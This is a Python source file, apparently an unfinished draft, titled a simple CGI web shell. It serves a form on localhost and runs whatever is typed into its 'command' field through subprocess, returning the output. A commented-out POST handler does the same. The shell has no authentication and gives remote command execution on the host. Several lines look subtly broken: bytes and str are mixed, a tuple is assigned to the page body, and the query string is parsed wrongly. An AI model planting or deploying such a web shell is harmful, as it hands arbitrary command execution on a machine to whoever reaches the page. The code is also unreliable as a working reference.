#!/usr/bin/env python3
#-*- coding: UTF-8 -*-

"""
NAME: python_cgi_simple_webshell.py
VERSION: 0.0.1
AUTHOR: Jesse Leverett (CyberThulhu)
STATUS: Building Initial code framework
DESCRIPTION:
TO-DO:
COPYRIGHT Â© 2021 Jesse Leverett
"""

# Imports
import cgi
import sys
import ssl
import cgitb
import argparse
import subprocess
from http.server import HTTPServer, BaseHTTPRequestHandler
from io import BytesIO

cgitb.enable()

# Added Variables
__author__ = "Jesse Leverett"
__copyright__ = "Copyright (C) 2021 Jesse Leverett"
__license__ = "MIT License"
__version__ = "0.0"

# Instantiate Argparser
PROG_DESCRIPTION = ""
PROG_EPILOG = ""
parser = argparse.ArgumentParser( prog="template_project", description=PROG_DESCRIPTION, epilog=PROG_EPILOG, formatter_class= argparse.RawDescriptionHelpFormatter)
PORT_TEXT_HELP = ""
parser.add_argument('-p', '--port', dest='port', type=int, default=8080, required=False, metavar="INT", help=PORT_TEXT_HELP)

# Parse Arguments
args = parser.parse_args()

def run(command):
    if not command:
       raise Exception("Commande vide")
    else:
       p = subprocess.Popen(command.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
       p.wait()
       out, err = p.communicate()
       return out

# Created Classes
class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
    """ Class """
    def do_GET(self):
        """ do_GET Function """
        global form
        self.send_response(200)
        self.end_headers()
        
        body = b"<html>\n<head>\n<title>Hello World</title>\n</head>\n<body>\n"
        body += b"<h4>Command Input</h4>"
        body += b"<form method='GET'>\n"
        body += b"<input type='text' name='command' />\n"
        body += b"<input type='submit' value='submit' />\n"
        body += b"</form>\n"
        form = cgi.FieldStorage(fp=self.rfile, headers=self.headers)
        if 'command' in form:
            cmd = form['command'].value
            body += b"<font face='monospace'>\n"
            body += b"$ %s" % (cmd)
            body += b"<br>\n"
            for i in run(cmd).split('\n'):
                body += i, b"<br>\n"
            body += b"</font>\n"

        body += b"</body>\n"
        body += b"</html>\n"
        
        self.wfile.write(body)

    # def do_POST(self):
    #     content_length = int(self.headers['Content-Length'])
    #     body = self.rfile.read(content_length)
    #     cmd = str(body).strip('\'').split("=")[1]
    #     results = subprocess.check_output(cmd)
    #     self.send_response(200)
    #     self.end_headers()
    #     response = BytesIO()
    #     response.write(b'This is a POST request. ')
    #     response.write(b'Received: \n')
    #     response.write(results)
    #     response.write(b"<html><body><a href=http://localhost:8080>home</a></body></html>")
    #     self.wfile.write(response.getvalue())

# Defined Functions
def main():
    """Main Code"""
    httpd = HTTPServer(('localhost', args.port), SimpleHTTPRequestHandler)
    #httpd.socket = ssl.wrap_socket(httpd.socket, certfile='', server_side=True)
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        httpd.socket.close()
        print("[!] Keyboard Interrupt Detected.")
        sys.exit(0)

# Main Code
if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        sys.exit(1)
